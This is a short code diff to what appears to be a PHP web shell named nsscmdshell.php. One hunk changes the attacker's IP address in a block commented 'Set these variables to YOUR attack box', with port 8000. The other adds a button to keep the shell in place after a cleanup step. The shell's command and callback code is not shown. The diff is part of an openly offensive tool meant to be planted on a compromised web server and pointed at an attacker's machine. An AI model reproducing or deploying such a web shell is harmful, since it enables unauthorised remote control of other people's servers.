@@ -8,7 +8,7 @@ function is_get_request() {
 }
 
 // Set these variables to YOUR attack box
-$attackip = "10.0.2.31";
+$attackip = "10.0.2.40";
 $attackport = "8000";
 ?>
 <!doctype html>
@@ -200,7 +200,7 @@ if (isset($_GET['phpInfo'])) {
             });
         });
     </script>
-                   <div style="width:50%;margin:20px 40px;padding:20px 30px;color:#fff;background-color:green;font-size:1.2em;"><p>Deleted: </p><?php echo $alerts; ?><p>Cleanup completed successfully.</p><p>Do you also want to delete nsscmdshell.php?</p> <form action="" method="get"><br><button id="btnSubmit" name="kill_me">Delete nsccmdshell.php </button></form></div>
+                   <div style="width:50%;margin:20px 40px;padding:20px 30px;color:#fff;background-color:green;font-size:1.2em;"><p>Deleted: </p><?php echo $alerts; ?><p>Cleanup completed successfully.</p><p>Do you also want to delete nsscmdshell.php?</p> <form action="" method="get"><br><button id="btnSubmit" name="kill_me">Delete nsccmdshell.php </button> <a role="button" href="?clear=true" class="btn"><button>Keep nsscmdshell.php</button></a></form></div>
 <?php
                 }
             } else {
